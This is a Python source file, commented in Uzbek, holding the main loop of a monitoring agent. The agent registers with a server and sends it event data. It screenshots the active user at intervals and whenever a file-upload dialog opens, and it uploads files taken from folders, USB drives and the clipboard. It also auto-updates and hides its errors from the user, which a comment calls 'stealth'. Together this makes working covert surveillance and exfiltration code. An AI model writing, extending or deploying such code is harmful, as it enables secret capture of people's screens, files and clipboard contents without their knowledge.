"""Agentning asosiy tsikli: kolektorlardan yig'ib, serverga yuboradi."""
import logging
import platform
import time

from core.config import load_config
from core.client import ServerClient
from core.version import VERSION
from core import updater
from collectors.factory import build_collectors

def _setup_logging():
    """Loglarni faylга yozadi (oynasiz exe uchun) va konsol bo'lsa unga ham."""
    import os
    from logging.handlers import RotatingFileHandler
    handlers = []
    try:
        from core.config import _state_dir
        path = os.path.join(_state_dir(), "agent.log")
        handlers.append(RotatingFileHandler(path, maxBytes=1_000_000, backupCount=2, encoding="utf-8"))
    except Exception:  # noqa: BLE001
        pass
    try:
        import sys
        if sys.stderr is not None:
            handlers.append(logging.StreamHandler())
    except Exception:  # noqa: BLE001
        pass
    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s %(levelname)s %(name)s: %(message)s",
        datefmt="%H:%M:%S",
        handlers=handlers or None,
    )


_setup_logging()
log = logging.getLogger("agent")


def main() -> None:
    cfg = load_config()
    log.info("Agent ishga tushdi. v%s uid=%s host=%s os=%s",
             VERSION, cfg.agent_uid[:8], cfg.hostname, platform.system())

    updater.cleanup_old()  # oldingi yangilanish qoldig'ini tozalash

    client = ServerClient(cfg.server_url, cfg.api_key, cfg.agent_uid)
    os_name = f"{platform.system()} {platform.release()}"

    def do_hello() -> bool:
        return client.hello(cfg.hostname, cfg.full_name, os_name,
                            ip_address=cfg.ip_address or None, agent_version=VERSION)

    registered = do_hello()

    # Ishga tushganda yangilanishni tekshirish
    if registered and updater.check_and_update(client, VERSION):
        return  # qayta ishga tushmoqda

    collectors, screenshot, file_providers = build_collectors(cfg.enabled_collectors)

    # Fayl tanlash/yuklash oynasini aniqlovchi + idle (faqat Windows)
    dialog_detector = None
    idle_fn = lambda: 0.0  # noqa: E731 — Windows bo'lmasa har doim "faol"
    if platform.system() == "Windows" and screenshot is not None:
        try:
            from collectors.windows import file_dialog_title as dialog_detector
            from collectors.windows import idle_seconds as idle_fn
        except Exception:  # noqa: BLE001
            dialog_detector = None

    last_screenshot = 0.0
    last_file = 0.0
    last_dialog_shot = 0.0
    last_hello = time.time()
    last_update_check = time.time()

    try:
        while True:
            # 0) Ro'yxatdan o'tmagan bo'lsa, avval qayta urinib ko'rish
            if not registered:
                registered = do_hello()

            # 1) Hodisalarni yig'ish
            events: list[dict] = []
            for c in collectors:
                try:
                    events.extend(c.poll())
                except Exception as e:  # noqa: BLE001
                    log.warning("%s kolektori xato berdi: %s", c.name, e)
            # Ro'yxatdan o'tgan bo'lsagina yuboramiz (aks holda navbatda saqlanadi)
            if registered:
                client.send_events(events)

            # 2) Skrinshot (o'z davrida) — foydalanuvchi FAOL bo'lganда (idle emas)
            now = time.time()
            if screenshot and now - last_screenshot >= cfg.screenshot_interval_sec and idle_fn() < 120:
                shot = screenshot.capture()
                if shot:
                    data, app, title = shot
                    client.send_screenshot(data, app, title)
                last_screenshot = now

            # 2c) Fayl yuborish lahzasi: "fayl tanlash/yuklash" oynasi ochilsa skrinshot
            if registered and screenshot and dialog_detector:
                dtitle = dialog_detector()
                if dtitle and now - last_dialog_shot >= 8:
                    shot = screenshot.capture()
                    if shot:
                        client.send_screenshot(shot[0], "Fayl yuborish (tanlash)", dtitle)
                    last_dialog_shot = now

            # 2b) Ushlangan fayllar (har ~8s): papka/USB + clipboard provayderlari
            if registered and file_providers and now - last_file >= 8:
                for fp in file_providers:
                    for _ in range(10):  # har provayderдан 10 tagacha fayl
                        f = fp.capture()
                        if not f:
                            break
                        client.send_file(
                            f["data"], f["filename"], f.get("mime", "application/octet-stream"),
                            f.get("channel", ""), f.get("source_path", ""),
                            f.get("source_url", ""), f.get("context_app", ""), f.get("context_title", ""),
                        )
                last_file = now

            # 3) Vaqti-vaqti bilan "men tirikman" (har 60s)
            if now - last_hello >= 60:
                client.hello(cfg.hostname, cfg.full_name, os_name,
                            ip_address=cfg.ip_address or None, agent_version=VERSION)
                last_hello = now

            # 4) Yangilanishni tekshirish (har 1 soat)
            if registered and now - last_update_check >= 3600:
                last_update_check = now
                if updater.check_and_update(client, VERSION):
                    return  # qayta ishga tushmoqda

            time.sleep(cfg.poll_interval_sec)
    except KeyboardInterrupt:
        log.info("Agent to'xtatildi.")


if __name__ == "__main__":
    try:
        main()
    except Exception:  # noqa: BLE001
        # Xato faqat agent.log'ga yoziladi. Foydalanuvchiga OYNA KO'RSATILMAYDI (stealth).
        log.exception("Agent ishga tushishда xato")
